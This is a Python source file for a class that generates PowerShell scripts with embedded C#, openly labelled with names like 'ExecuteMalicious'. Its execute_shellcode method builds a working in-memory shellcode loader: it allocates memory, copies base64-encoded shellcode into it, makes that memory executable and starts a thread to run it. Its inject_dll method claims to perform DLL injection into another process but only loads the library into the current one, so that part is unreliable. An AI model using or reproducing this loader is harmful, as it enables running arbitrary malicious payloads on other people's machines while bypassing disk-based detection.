
import base64
from typing import Optional, Dict, Any


class PSCSharpLoader:
    """
    Execute C# code from PowerShell:
    1. Add-Type compiles C# at runtime
    2. Call C# methods from PowerShell
    3. Access Win32 APIs directly
    4. Load assemblies from memory
    """

    @staticmethod
    def generate_script(csharp_code: str, class_name: str = "MaliciousClass", method_name: str = "ExecuteMalicious") -> str:
        """Generates PowerShell script with embedded C# code."""
        ps_script = f"""
Add-Type -TypeDefinition @\"
using System;
using System.Runtime.InteropServices;

public class {class_name} {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string moduleName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    {csharp_code}
}}
\"@

[{class_name}]::{method_name}()
"""
        return ps_script

    @staticmethod
    def execute_shellcode(shellcode: bytes) -> str:
        """Generate script to execute shellcode via C# in PowerShell."""
        shellcode_b64 = base64.b64encode(shellcode).decode('ascii')
        csharp_impl = f"""
    public static void ExecuteMalicious() {{
        byte[] sc = Convert.FromBase64String("{shellcode_b64}");
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, addr, sc.Length);
        uint old = 0;
        VirtualProtect(addr, (UIntPtr)sc.Length, 0x20, out old);
        IntPtr t = CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }}
"""
        return PSCSharpLoader.generate_script(csharp_impl)

    @staticmethod
    def inject_dll(process_id: int, dll_path: str) -> str:
        """Generate script to inject DLL via C# (simplified)."""
        csharp_impl = f"""
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibraryA(string lpLibFileName);
    
    public static void ExecuteMalicious() {{
        IntPtr hProc = OpenProcess(0x1F0FFF, false, {process_id});
        if (hProc != IntPtr.Zero) {{
            LoadLibraryA("{dll_path}");
        }}
    }}
"""
        return PSCSharpLoader.generate_script(csharp_impl)
